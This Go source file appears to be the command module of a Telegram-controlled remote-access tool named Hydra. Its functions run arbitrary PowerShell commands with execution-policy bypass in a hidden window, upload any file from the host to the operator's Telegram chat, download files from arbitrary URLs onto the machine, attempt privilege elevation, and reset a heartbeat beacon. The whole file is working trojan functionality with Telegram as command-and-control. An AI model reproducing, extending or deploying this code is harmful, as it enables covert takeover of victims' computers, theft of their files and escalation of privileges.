package commands

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	fmtPing = "Pong!\nRequest took %s"
	fmtRoot = "Elevation failed: %s"
)

func Ping() {
	back := time.Now()
	cfg := tgbotapi.NewMessage(util.ChatID, "Pong!")
	msg, err := api.Bot.Send(cfg)
	util.Handle(err)

	eCfg := tgbotapi.NewEditMessageText(util.ChatID, msg.MessageID, "")
	eCfg.Text = fmt.Sprintf(fmtPing, time.Since(back))
	_, err = api.Bot.Send(eCfg)
	util.Handle(err)
}

func Reset() {
	api.NewGenesis()
	go api.Heartbeat()
}

func Shell(command string) {
	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	b, err := cmd.CombinedOutput()
	out := string(b)
	if err != nil {
		out = err.Error() + "\n" + out
	}
	if out == "" {
		out = "<success>"
	}
	api.SendFragmented(strings.TrimSpace(out), "\n", "```\n", "```")
}

//UploadFile handles /file commands by checking for and uploading a file.
func UploadFile(file string) {
	fi, err := os.Stat(file)
	if os.IsNotExist(err) {
		api.Bot.Send(tgbotapi.NewMessage(util.ChatID, "The specified file does not exist."))
		return
	}
	if fi.IsDir() {
		api.Bot.Send(tgbotapi.NewMessage(util.ChatID, "This command expects a file, not a directory."))
		return
	}
	api.Bot.Send(tgbotapi.NewDocumentUpload(util.ChatID, file))
}

//Download attempts do download a file and save it.
func Download(args string) {
	arr := strings.SplitN(args, " ", 2)
	url, fn := arr[0], arr[1]
	cfg := tgbotapi.NewMessage(util.ChatID, "xd")
	defer api.Bot.Send(&cfg)

	res, err := http.Get(url)
	if err != nil {
		cfg.Text = err.Error()
		return
	}
	defer res.Body.Close()

	file, err := os.Create(fn)
	if err != nil {
		cfg.Text = err.Error()
		return
	}
	defer file.Close()

	_, err = io.Copy(file, res.Body)
	if err != nil {
		cfg.Text = err.Error()
	} else {
		cfg.Text = fmt.Sprintf("File saved as `%s`", strings.ReplaceAll(fn, "`", "\\`"))
	}
}

//Command handler for /root
func Elevate() {
	err := util.ElevateLogic()
	cfg := tgbotapi.NewMessage(util.ChatID, fmt.Sprintf(fmtRoot, err))
	if err == nil {
		cfg.Text = "Elevation successful"
	}
	api.Bot.Send(cfg)
}
